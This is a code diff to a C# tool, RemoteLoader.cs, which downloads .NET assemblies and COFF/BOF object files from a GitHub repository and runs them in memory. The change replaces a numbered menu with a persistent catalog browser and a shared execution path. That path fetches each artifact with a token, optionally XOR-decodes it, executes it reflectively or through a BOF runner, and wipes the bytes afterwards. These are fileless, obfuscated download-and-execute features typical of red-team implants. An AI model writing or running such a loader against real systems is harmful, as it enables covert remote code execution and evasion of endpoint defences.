@@ -1,4 +1,4 @@
-/*
+﻿/*
  * RemoteLoader.cs -- in-memory .NET and COFF/BOF loader from a GitHub repository.
  *
  * Compile (.NET 8 SDK):
@@ -745,58 +745,91 @@ BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
 
             if (binaries.Count == 0) { Err("No .exe/.dll files found."); return 1; }
 
-            // -- Menu --
-            Console.WriteLine();
-            Console.ForegroundColor = ConsoleColor.Cyan;
-            Console.WriteLine("  Available binaries:\n");
-            Console.ResetColor();
+            // -- Build the reusable artifact catalog --
+            // (replaces the old one-shot numbered menu; the interactive
+            //  browser below keeps `list`/`search`/`run`/`use`/`refresh` etc.)
+            var catalog = ArtifactCatalog.Build(branch, binaries);
 
-            for (int i = 0; i < binaries.Count; i++)
-                Console.WriteLine($"  [{i + 1,2}]  {binaries[i].Name,-42} {binaries[i].Size / 1024,6} KB");
-            Console.WriteLine("  [ 0]  Exit\n");
-            Console.ForegroundColor = ConsoleColor.DarkGray;
-            Console.WriteLine("  [!] Supports managed .NET assemblies and COFF/BOF files (.o). Native PE binaries will be rejected.\n");
-            Console.ResetColor();
+            // --list: show the catalog and exit (legacy --list behaviour) --
+            if (listOnly)
+            {
+                Console.WriteLine();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine("  Available artifacts:\n");
+                Console.ResetColor();
+                foreach (var e in catalog.Entries)
+                    Console.WriteLine($" [{e.Index,2}]  {e.PrimaryAlias,-14} {e.OriginalName,-42} {e.DisplayArch,-8} {HumanSize(e.Size)}");
+                Console.WriteLine("  [ 0]  Exit\n");
+                Console.ForegroundColor = ConsoleColor.DarkGray;
+                Console.WriteLine("  [!] Supports managed .NET assemblies and COFF/BOF files (.o). Native PE binaries will be rejected.\n");
+                Console.ResetColor();
+                return 0;
+            }
 
-            if (listOnly) return 0;
-
-            (string Name, string DownloadUrl, long Size) chosen = default;
-
+            // --exec: legacy non-interactive selection (one shot) --
             if (execName != null)
             {
-                chosen = binaries.FirstOrDefault(b =>
-                    b.Name.Equals(execName, StringComparison.OrdinalIgnoreCase) ||
-                    b.Name.Contains(execName, StringComparison.OrdinalIgnoreCase));
-                if (chosen.Name == null) { Err($"--exec: no match for '{execName}'"); return 1; }
-                Info($"Selected (--exec): {chosen.Name}");
-            }
-            else
-            {
-                Console.Write("Select number or partial filename: ");
-                string sel = (Console.ReadLine() ?? "0").Trim();
-
-                if (sel is "0" or "exit" or "q") return 0;
-
-                if (int.TryParse(sel, out int idx) && idx >= 1 && idx <= binaries.Count)
-                    chosen = binaries[idx - 1];
-                else
-                    chosen = binaries.FirstOrDefault(b =>
-                        b.Name.Contains(sel, StringComparison.OrdinalIgnoreCase));
-
-                if (chosen.Name == null) { Err($"No match for: {sel}"); return 1; }
+                var entry = catalog.Entries.FirstOrDefault(e =>
+                    e.OriginalName.Equals(execName, StringComparison.OrdinalIgnoreCase) ||
+                    e.OriginalName.Contains(execName, StringComparison.OrdinalIgnoreCase));
+                if (entry == null) { Err($"--exec: no match for '{execName}'"); return 1; }
+                Info($"Selected (--exec): {entry.OriginalName}");
+                string rawArgs;
+                if (execArgs != null) rawArgs = execArgs;
+                else { Console.Write("Arguments (blank for none): "); rawArgs = (Console.ReadLine() ?? "").Trim(); }
+                int rc = await ExecuteArtifactAsync(http, xorKey, bofEntry, entry, rawArgs);
+                if (rc == 0) Info("Done.");
+                return rc;
             }
 
-            if (string.IsNullOrEmpty(chosen.DownloadUrl)) { Err($"No download_url for {chosen.Name}"); return 1; }
+            // -- Interactive persistent catalog browser --
+            // refresh: re-query GitHub + rebuild the catalog (re-uses the same
+            //          http client / auth / error handling as the initial list)
+            // execute: hand an artifact + raw arg string to the shared loader
+            var cli = new ArtifactCli(
+                Console.In, Console.Out,
+                refresh: async () =>
+                {
+                    Info($"Re-querying github.com/{owner}/{repo}/{folder} (branch: {branch}) ...");
+                    List<(string Name, string DownloadUrl, long Size)> fresh;
+                    try { fresh = await ListBinaries(http, owner, repo, folder, branch); }
+                    catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)404)
+                    { Err($"Path not found: {owner}/{repo}/{folder}"); return null; }
+                    catch (HttpRequestException ex) when (ex.StatusCode == (HttpStatusCode)403)
+                    { Err("Rate limit or auth required (403). Use --token."); return null; }
+                    catch (Exception ex)
+                    { Err($"GitHub API error: {ex.Message}"); return null; }
+                    if (fresh.Count == 0) { Err("No .exe/.dll/.o files found."); return null; }
+                    return ArtifactCatalog.Build(branch, fresh);
+                },
+                execute: (e, args) => ExecuteArtifactAsync(http, xorKey, bofEntry, e, args));
+            return await cli.RunLoop();
+        }
 
-            // -- Download --
-            Info($"Downloading {chosen.Name} ...");
+        // -- Shared execution path ------------------------------------------
+        // Used by --exec, the REPL `run`/direct-alias invocation, and the
+        // active-artifact prompt. Downloads via the existing http client (same
+        // auth/headers), optionally XOR-decodes, and dispatches to BofRunner
+        // for COFF/BOF or to the reflective .NET loader otherwise.
+        //
+        // rawArgs is passed *unchanged*: BOF packing consumes it directly, the
+        // .NET path tokenises it via the existing quote-aware ParseArgs. No
+        // shell construction, no eval, no string interpolation into a command.
+        private static async Task<int> ExecuteArtifactAsync(
+            HttpClient http, byte xorKey, string bofEntry, ArtifactEntry entry, string rawArgs)
+        {
+            if (string.IsNullOrEmpty(entry.DownloadUrl))
+            { Err($"No download_url for {entry.OriginalName}"); return 1; }
+
+            Info($"Downloading {entry.OriginalName} ...");
             byte[] asmBytes;
-            try   { asmBytes = await http.GetByteArrayAsync(chosen.DownloadUrl); }
+            try   { asmBytes = await http.GetByteArrayAsync(entry.DownloadUrl); }
             catch (Exception ex) { Err($"Download failed: {ex.Message}"); return 1; }
             Ok($"{asmBytes.Length:N0} bytes received");
 
-            // PAT no longer needed -- clear it from the header pool
-            http.DefaultRequestHeaders.Remove("Authorization");
+            // The legacy one-shot path cleared Authorization after the first
+            // download. The persistent browser keeps it so `refresh` can
+            // re-query private repos (the token was needed for listing too).
 
             if (xorKey != 0)
             {
@@ -809,18 +842,9 @@ BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
             // -- BOF (COFF object) path --
             if (BofRunner.IsBof(asmBytes))
             {
-                Ok($"{chosen.Name} detected as COFF/BOF -- using BofRunner");
+                Ok($"{entry.OriginalName} detected as COFF/BOF -- using BofRunner");
 
-                string rawBofArgs;
-                if (execArgs != null) { rawBofArgs = execArgs; }
-                else
-                {
-                    Console.ForegroundColor = ConsoleColor.DarkGray;
-                    Console.WriteLine("  BOF args: i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>");
-                    Console.ResetColor();
-                    Console.Write("Arguments (blank for none): ");
-                    rawBofArgs = (Console.ReadLine() ?? "").Trim();
-                }
+                string rawBofArgs = rawArgs ?? "";
                 byte[] packedArgs = PackBofArgs(rawBofArgs);
 
                 var bofOpts = new BofOptions
@@ -829,7 +853,7 @@ BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
                     Log        = s => Warn(s),
                 };
                 using var runner = new BofRunner(bofOpts);
-                Info($"Executing BOF {chosen.Name}{(packedArgs.Length > 0 ? $" ({packedArgs.Length} packed bytes)" : "")} ...");
+                Info($"Executing BOF {entry.OriginalName}{(packedArgs.Length > 0 ? $" ({packedArgs.Length} packed bytes)" : "")} ...");
                 var result = runner.Run(asmBytes, packedArgs);
                 ClearBytes(asmBytes);
                 if (result.Output.Length > 0) Console.WriteLine(result.Output);
@@ -841,7 +865,7 @@ BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
             // -- Verify managed assembly --
             if (!IsNetAssembly(asmBytes))
             {
-                Err($"{chosen.Name} is a native/unmanaged binary (PyInstaller, C++, etc.) -- cannot reflectively load.");
+                Err($"{entry.OriginalName} is a native/unmanaged binary (PyInstaller, C++, etc.) -- cannot reflectively load.");
                 ClearBytes(asmBytes);
                 return 1;
             }
@@ -861,28 +885,22 @@ BOF arg format (--args):  i=<int32>  s=<int16>  z=<ascii>  Z=<wide>  b=<hex>
             ClearBytes(asmBytes);
             Ok($"Loaded: {asm.GetName().Name}");
 
-            // -- Args --
-            string[] toolArgs;
-            string   argsDisplay;
-            if (execArgs != null)
-            {
-                toolArgs    = ParseArgs(execArgs);
-                argsDisplay = execArgs;
-            }
-            else
-            {
-                Console.Write("Arguments (blank for none): ");
-                string raw  = (Console.ReadLine() ?? "").Trim();
-                toolArgs    = string.IsNullOrWhiteSpace(raw) ? Array.Empty<string>() : ParseArgs(raw);
-                argsDisplay = raw;
-            }
-
-            Info($"Executing {chosen.Name}{(toolArgs.Length > 0 ? $" -- {argsDisplay}" : "")} ...");
+            // -- Args: passed through the existing structured handler --
+            string[] toolArgs    = string.IsNullOrWhiteSpace(rawArgs) ? Array.Empty<string>() : ParseArgs(rawArgs!);
+            string   argsDisplay  = rawArgs ?? "";
+            Info($"Executing {entry.OriginalName}{(toolArgs.Length > 0 ? $" -- {argsDisplay}" : "")} ...");
 
             // -- Invoke --
             int rc = InvokeMain(asm, toolArgs);
-            if (rc == 0) Info("Done.");
             return rc;
+        }
+
+        // Human-readable size for the catalog listing.
+        private static string HumanSize(long bytes)
+        {
+            if (bytes >= 1024L * 1024L) return $"{bytes / (1024L * 1024L)} MB";
+            if (bytes >= 1024L)         return $"{bytes / 1024L} KB";
+            return $"{bytes} B";
         }
     }
 }
